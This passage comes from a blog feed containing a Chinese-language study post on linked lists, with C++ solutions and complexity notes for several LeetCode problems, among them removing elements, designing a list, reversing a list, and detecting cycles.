<span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>BFS &amp; DFS</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>BFS</tag>
        <tag>DFS</tag>
      </tags>
  </entry>
  <entry>
    <title>链表</title>
    <url>/2023/09/11/%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="1-链表的定义"><a href="#1-链表的定义" class="headerlink" title="1.链表的定义"></a>1.链表的定义</h1><p>链表在内存中的排列不是连续的</p>
<p>在自己面试时，ACM模式下，需要自己构造链表。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//单链表</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;<span class="comment">//节点上存储的元素</span></span><br><span class="line">    ListNode *next;<span class="comment">//指向下一个节点的指针</span></span><br><span class="line">    <span class="built_in">ListNode</span> (<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">NULL</span>)&#123;&#125;<span class="comment">//节点的构造函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/11/%E9%93%BE%E8%A1%A8/image-20230911093747449.png" alt="image-20230911093747449"></p>
<h1 id="2-leetcode-203-移除链表的元素"><a href="#2-leetcode-203-移除链表的元素" class="headerlink" title="2.leetcode-203-移除链表的元素"></a>2.leetcode-203-移除链表的元素</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/remove-linked-list-elements/">203. 移除链表元素 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong>虚拟头节点—–解决删除头节点问题，new一个新节点</p>
<p><img src="/2023/09/11/%E9%93%BE%E8%A1%A8/image-20230911100121215.png" alt="image-20230911100121215"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeElements</span><span class="params">(ListNode* head, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        ListNode* dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);<span class="comment">//定义虚拟头指针</span></span><br><span class="line">        dummyHead-&gt;next = head;</span><br><span class="line">        ListNode* cur = dummyHead;</span><br><span class="line">        <span class="keyword">while</span> (cur-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cur-&gt;next-&gt;val == val) &#123;</span><br><span class="line">                ListNode* temp = cur-&gt;next;</span><br><span class="line">                cur-&gt;next = cur-&gt;next-&gt;next;<span class="comment">//指向下下个节点</span></span><br><span class="line">                <span class="keyword">delete</span> temp;<span class="comment">//删除内存</span></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                cur = cur-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        head = dummyHead-&gt;next;<span class="comment">//获取新的头指针</span></span><br><span class="line">        <span class="keyword">delete</span> dummyHead;<span class="comment">//删除头指针</span></span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h1 id="3-leetcode-707-设计链表"><a href="#3-leetcode-707-设计链表" class="headerlink" title="3.leetcode-707-设计链表"></a>3.leetcode-707-设计链表</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/design-linked-list/">707. 设计链表 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong>五个任务-<strong>统一使用虚拟头节点。</strong></p>
<ol>
<li><p>获取第<code>n</code>个节点</p>
<p><code>n</code>是从<code>0</code>开始的，<code>n&lt;0</code>，<code>n&gt;size - 1</code>都是不合法的。</p>
<p><code>while (n)&#123;cur = cur -&gt;next; n--;&#125;</code></p>
</li>
<li><p>头部插入节点</p>
<p>先定义一个新的链表节点。正确的顺序：先指向<code>dummyhead-&gt;next</code>，然后再让<code>dummyhead-&gt;</code>指向<code>newnode</code>。</p>
<p><img src="/2023/09/11/%E9%93%BE%E8%A1%A8/image-20230911103242170.png" alt="image-20230911103242170"></p>
</li>
<li><p>尾部插入节点</p>
<p>找尾部<code>while(cur-&gt; != NULL)</code>循环条件。</p>
<p><code>cur-&gt;next = newnode;</code></p>
</li>
<li><p>第<code>n</code>个节点前插入节点</p>
<p><code>cur</code>一定指向第<code>n</code>个节点前一个节点。<strong>一定保证第<code>n</code>个节点是<code>cur-&gt;next</code>！！</strong>才能保证和之前插入一样。</p>
<p><code>while(n--)</code></p>
</li>
<li><p>删除第<code>n</code>个节点</p>
<p>合法性判断。一定保证第<code>n</code>个节点是<code>cur-&gt;next``while(n--)</code></p>
</li>
</ol>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//定义链表结果</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LinkedNode</span> &#123;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        LinkedNode* next;</span><br><span class="line">        <span class="built_in">LinkedNode</span>(<span class="type">int</span> val):<span class="built_in">val</span>(val), <span class="built_in">next</span>(<span class="literal">nullptr</span>)&#123;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MyLinkedList</span>() &#123;</span><br><span class="line">        _dummyNode = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(<span class="number">0</span>);<span class="comment">//定义虚拟头节点</span></span><br><span class="line">        _size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">get</span><span class="params">(<span class="type">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//边界判断</span></span><br><span class="line">        <span class="keyword">if</span>(index &gt; _size - <span class="number">1</span> || index &lt; <span class="number">0</span>)<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        LinkedNode* cur = _dummyNode;<span class="comment">//从原来的头节点开始遍历 </span></span><br><span class="line">        <span class="keyword">while</span> (index--) &#123;</span><br><span class="line">            cur = cur-&gt;next;<span class="comment">//进行迭代 可用index =0 </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur-&gt;next-&gt;val;<span class="comment">//返回值 第index个永远是cur-&gt;next指向的</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addAtHead</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        LinkedNode* newNode = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(val);</span><br><span class="line">        newNode-&gt;next = _dummyNode-&gt;next;</span><br><span class="line">        _dummyNode-&gt;next = newNode;</span><br><span class="line">        _size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addAtTail</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        LinkedNode* cur = _dummyNode;<span class="comment">//代入空链表判断</span></span><br><span class="line">        <span class="keyword">while</span> (cur-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedNode* newNode = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(val);</span><br><span class="line">        cur-&gt;next = newNode;</span><br><span class="line">        _size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在第index个节点之前插入一个新节点，例如index为0，那么新节点作为链表的新头节点</span></span><br><span class="line">    <span class="comment">//如果index等于链表的长度，则说明是新节点是新尾节点</span></span><br><span class="line">    <span class="comment">//如果index大于链表的长度，则返回kong</span></span><br><span class="line">    <span class="comment">//如果index小于0，则在头部插入节点</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt; _size) <span class="keyword">return</span>;<span class="comment">//大于链表</span></span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span>) index = <span class="number">0</span>;<span class="comment">//小于0</span></span><br><span class="line"></span><br><span class="line">        LinkedNode* cur = _dummyNode;<span class="comment">//注意！！！！ 可以用index=0判断</span></span><br><span class="line">        LinkedNode* newNode = <span class="keyword">new</span> <span class="built_in">LinkedNode</span>(val);</span><br><span class="line">        <span class="keyword">while</span> (index--) &#123;</span><br><span class="line">            cur = cur-&gt;next;<span class="comment">//轮询要插入的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        newNode-&gt;next = cur-&gt;next;<span class="comment">//先让新节点指向next</span></span><br><span class="line">        cur-&gt;next = newNode;<span class="comment">//在进行cur的替换</span></span><br><span class="line">        _size++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//删除第n个节点，如果index大于链表则直接return，index从0开始</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= _size || index &lt; <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        LinkedNode* cur = _dummyNode;</span><br><span class="line">        <span class="keyword">while</span> (index--) &#123;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedNode* temp = cur-&gt;next;<span class="comment">//要删除的节点</span></span><br><span class="line">        cur-&gt;next = cur-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">        temp = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="comment">//delete命令指示释放了temp指针原本所指的那部分内存，</span></span><br><span class="line">        <span class="comment">//被delete后的指针temp的值（地址）并非就是NULL，而是随机值。也就是被delete后，</span></span><br><span class="line">        <span class="comment">//如果不再加上一句temp=nullptr,temp会成为乱指的野指针</span></span><br><span class="line">        <span class="comment">//如果之后的程序不小心使用了temp，会指向难以预想的内存空间</span></span><br><span class="line">        _size--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">printLinkedList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        LinkedNode* cur = _dummyNode;</span><br><span class="line">        <span class="keyword">while</span> (cur-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            cout &lt;&lt; cur-&gt;next-&gt;val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> _size;</span><br><span class="line">    LinkedNode* _dummyNode;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyLinkedList object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyLinkedList* obj = new MyLinkedList();</span></span><br><span class="line"><span class="comment"> * int param_1 = obj-&gt;get(index);</span></span><br><span class="line"><span class="comment"> * obj-&gt;addAtHead(val);</span></span><br><span class="line"><span class="comment"> * obj-&gt;addAtTail(val);</span></span><br><span class="line"><span class="comment"> * obj-&gt;addAtIndex(index,val);</span></span><br><span class="line"><span class="comment"> * obj-&gt;deleteAtIndex(index);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>



<h1 id="4-leetcode-206-反转链表"><a href="#4-leetcode-206-反转链表" class="headerlink" title="4.leetcode-206-反转链表"></a>4.leetcode-206-反转链表</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/reverse-linked-list/description/">206. 反转链表 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ol>
<li><p><strong>双指针</strong></p>
<p>双指针：<code>pre</code>和<code>cur</code>。</p>
<p>初始化：<code>cur = head</code>，<code>pre = NULL</code></p>
<p>遍历：<code>while(cur != NULL)</code> 临时指针<code>temp</code>先保存<code>cur-&gt;next</code>，当前的<code>cur-&gt;next = pre</code>;<code>cur = pre</code>；<code> cur = temp</code>。先移动<code>pre</code>，后移动<code>cur</code></p>
<p>返回：<code>return pre</code></p>
<p><img src="/2023/09/11/%E9%93%BE%E8%A1%A8/image-20230912105333603.png" alt="image-20230912105333603"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* cur = head;<span class="comment">//初始化</span></span><br><span class="line">        ListNode* pre = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (cur) &#123;<span class="comment">//循环条件 cur不为null</span></span><br><span class="line">            ListNode* temp = cur-&gt;next;<span class="comment">//临时指针用于暂存cur的下一个节点</span></span><br><span class="line">            cur-&gt;next = pre;<span class="comment">//初始节点反转后作为尾节点 将当前cur的next指向null</span></span><br><span class="line">            pre = cur;<span class="comment">//更新值</span></span><br><span class="line">            cur = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


</li>
<li><p>**递归 **—-按照双指针解法延申</p>
<p>递归函数：<code>reverse(cur, pre)</code></p>
<p>退出条件：<code>if(cur == NULL)</code> <code>return pre;</code></p>
<p>递归写法：<code>temp = cur-&gt;next;</code></p>
<p>​					<code>cur-&gt;next = pre;</code></p>
<p>​					<code>reverse(temp, cur);</code></p>
<p>主函数中初始化：<code>reverse(head, NULL)</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverse</span><span class="params">(ListNode* pre,ListNode* cur)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">NULL</span>) <span class="keyword">return</span> pre;</span><br><span class="line">        ListNode* temp = cur-&gt;next;</span><br><span class="line">        cur-&gt;next = pre;</span><br><span class="line">        <span class="comment">// 可以和双指针法的代码进行对比，如下递归的写法，其实就是省略了这两步</span></span><br><span class="line">        <span class="comment">// pre = cur;</span></span><br><span class="line">        <span class="comment">// cur = temp;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reverse</span>(cur,temp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 和双指针法初始化是一样的逻辑</span></span><br><span class="line">        <span class="comment">// ListNode* cur = head;</span></span><br><span class="line">        <span class="comment">// ListNode* pre = NULL;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">reverse</span>(<span class="literal">NULL</span>, head);<span class="comment">//!!!</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="5-leetcode-24-两两交换链表中的节点"><a href="#5-leetcode-24-两两交换链表中的节点" class="headerlink" title="5.leetcode-24-两两交换链表中的节点"></a>5.leetcode-24-两两交换链表中的节点</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/swap-nodes-in-pairs/description/">24. 两两交换链表中的节点 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong>操作的指针一定要在交换节点的<strong>前一个节点</strong>，</p>
<p>终止条件：<code>while(cur -&gt; next != null &amp;&amp; cur-&gt;next-&gt;next != null)</code>，注意判断顺序，先判断一个next 可能存在next为空指针，造成空指针异常。</p>
<p>交换步骤：<code>temp = cur -&gt; next</code>; <code>temp1 = cur -&gt;next -&gt;next -&gt; next</code></p>
<p><img src="/2023/09/11/%E9%93%BE%E8%A1%A8/image-20230913104059134.png" alt="image-20230913104059134"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">swapPairs</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* dummy_head = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);<span class="comment">//虚拟头节点</span></span><br><span class="line">        dummy_head-&gt;next = head;<span class="comment">//指向头节点</span></span><br><span class="line">        ListNode* cur = dummy_head;</span><br><span class="line">        <span class="keyword">while</span> (cur-&gt;next != <span class="literal">NULL</span> &amp;&amp; cur-&gt;next-&gt;next != <span class="literal">NULL</span>) &#123;<span class="comment">//终止条件！！！</span></span><br><span class="line">            <span class="comment">//直接模拟交换过程就好</span></span><br><span class="line">            ListNode* temp = cur-&gt;next;</span><br><span class="line">            ListNode* temp1 = cur-&gt;next-&gt;next-&gt;next;<span class="comment">//!!!</span></span><br><span class="line"></span><br><span class="line">            cur-&gt;next = cur-&gt;next-&gt;next;<span class="comment">//第一次，可以看示意图</span></span><br><span class="line">            cur-&gt;next-&gt;next = temp;<span class="comment">//第二次</span></span><br><span class="line">            cur-&gt;next-&gt;next-&gt;next = temp1;<span class="comment">//第三次</span></span><br><span class="line"></span><br><span class="line">            cur = cur-&gt;next-&gt;next;<span class="comment">//cur迭代，指向交换元素的上一个</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy_head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度：</strong></p>
<ul>
<li>时间复杂度O(n)</li>
<li>空间复杂度O(1)</li>
</ul>
<h1 id="6-leetcode-19-删除链表的倒数第N个节点"><a href="#6-leetcode-19-删除链表的倒数第N个节点" class="headerlink" title="6.leetcode-19-删除链表的倒数第N个节点"></a>6.leetcode-19-删除链表的倒数第N个节点</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/remove-nth-node-from-end-of-list/description/">19. 删除链表的倒数第 N 个结点 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>删除节点—&gt;操作指针一定要指向前一个节点</li>
<li>虚拟头节点</li>
<li>快慢指针，<code>fast</code>先移动<code>n+1步</code>，然后<code>fast</code>和<code>slow</code>一起动，直到<code>fast</code>指向<code>NULL</code>.</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        ListNode* dummyHead = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);<span class="comment">//虚拟头节点</span></span><br><span class="line">        dummyHead-&gt;next = head;</span><br><span class="line">        ListNode* fast = dummyHead; </span><br><span class="line">        ListNode* slow = dummyHead;</span><br><span class="line">        n++;<span class="comment">//用于让fast多走一步</span></span><br><span class="line">        <span class="keyword">while</span> (n-- &amp;&amp; fast != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            fast = fast-&gt;next;<span class="comment">//快指针先走 </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">            slow = slow-&gt;next;<span class="comment">//一起走</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//进行交换</span></span><br><span class="line">        ListNode* temp = slow-&gt;next;</span><br><span class="line">        slow-&gt;next = slow-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line">        temp = <span class="literal">nullptr</span>;<span class="comment">//防止temp成为野指针</span></span><br><span class="line">        <span class="keyword">return</span> dummyHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n)—-&gt;n是要删除第n个节点</li>
<li>空间复杂度：O(1)</li>
</ul>
<h1 id="7-面试题02-07-链表相交"><a href="#7-面试题02-07-链表相交" class="headerlink" title="7.面试题02.07-链表相交"></a>7.面试题02.07-链表相交</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/intersection-of-two-linked-lists-lcci/description/">面试题 02.07. 链表相交 - 力扣（LeetCode）</a></p>
<p><strong>思路：</strong></p>
<ul>
<li>求两个链表交点节点的指针</li>
<li>交点不是数值相等<strong>而是指针相等！！!</strong></li>
<li>先求出两个链表的长度，然算出插值，然后让<code>curA</code>移动到和<code>curB</code>末尾对齐的位置，此时进行判断，不相同则同时向后移动。</li>
</ul>
<p><strong>代码实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">getIntersectionNode</span><span class="params">(ListNode *headA, ListNode *headB)</span> </span>&#123;</span><br><span class="line">        ListNode* curA = headA;</span><br><span class="line">        ListNode* curB = headB;</span><br><span class="line">        <span class="comment">//求链表长度</span></span><br><span class="line">        <span class="type">int</span> lenA = <span class="number">0</span>, lenB = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(curA != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            lenA++;</span><br><span class="line">            curA = curA-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (curB != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            lenB++;</span><br><span class="line">            curB = curB-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//重新赋值</span></span><br><span class="line">        curA = headA;</span><br><span class="line">        curB = headB;</span><br><span class="line">        <span class="comment">//让curA为最长链表的头 lenA为长度</span></span><br><span class="line">        <span class="keyword">if</span> (lenB &gt; lenA) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(lenA, lenB);</span><br><span class="line">            <span class="built_in">swap</span>(curA, curB);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//长度差</span></span><br><span class="line">        <span class="type">int</span> gap  = lenA - lenB;</span><br><span class="line">        <span class="comment">//移动a与b尾部对齐</span></span><br><span class="line">        <span class="keyword">while</span> (gap--) &#123;</span><br><span class="line">            curA = curA-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断</span></span><br><span class="line">        <span class="keyword">while</span> (curA != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (curA == curB) &#123;</span><br><span class="line">                <span class="keyword">return</span> curA;<span class="comment">//指针相等 ---不是数值相等喔</span></span><br><span class="line">            &#125;</span><br><span class="line">            curA = curA-&gt;next;</span><br><span class="line">            curB = curB-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n+m)遍历两个链表的长度</li>
<li>空间复杂度：O(1)</li>
</ul>
<h1 id="8-leetcode-142-环形链表Ⅱ"><a href="#8-leetcode-142-环形链表Ⅱ" class="headerlink" title="8.leetcode-142-环形链表Ⅱ"></a>8.leetcode-142-环形链表Ⅱ</h1><p><strong>题目：</strong><a href="https://leetcode.cn/problems/linked-list-cycle-ii/description/">142. 环形链表 II - 力扣（LeetCode）</a></p>
<p><strong>解法一：</strong></p>
<ul>
<li>遍历链表，用哈希表存储节点出现的次数</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        ListNode* cur = head;</span><br><span class="line">        unordered_map&lt;ListNode*, <span class="type">int</span>&gt;cnt;<span class="comment">//构建哈希表</span></span><br><span class="line">        <span class="keyword">while</span> (cur != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            cnt[cur]++;<span class="comment">//遍历链表</span></span><br><span class="line">            <span class="keyword">if</span> (cnt[cur] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> cur;<span class="comment">//重复出现则返回</span></span><br><span class="line">            &#125;</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>复杂度分析：</strong></p>
<ul>
<li>时间复杂度：O(n)遍历节点</li>
<li>空间复杂度：O(n)将链表每个节点存在哈希表中</li>
</ul>
<p><strong>法二—双指针：</strong><a href="https://www.bilibili.com/video/BV1if4y1d7ob/?vd_source=fa4d4e7f9b99f8e27a2b9dca08ea044a">把环形链表讲清楚！ 如何判断环形链表？如何找到环形链表的入口？ LeetCode：142.环形链表II_哔哩哔哩_bilibili</a></p>
<p>用快慢指针降低空间复杂度！！！</p>
<p>链表无环则不可能相遇，有环必定相遇！</p>
<p>快指针走两个节点，慢指针走一个节点。相对于慢指针，快指针每次移动一个节点。</p>
<p>要求<code>x</code>入口处节点</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        ListNode* fast = head;</span><br><span class="line">        ListNode* slow = head;</span><br><span class="line">        <span class="keyword">while</span>(fast != <span class="literal">NULL</span> &amp;&amp; fast-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            fast = fast-&gt;next-&gt;next;</span><br><span class="line">            <span class="comment">// 快慢指针相遇，此时从head 和 相遇点，同时查找直至他们相遇</span></span><br><span class="line">            <span class="keyword">if</span> (slow == fast) &#123;</span><br><span class="line">                ListNode* index1 = fast;</span><br><span class="line">                ListNode* index2 = 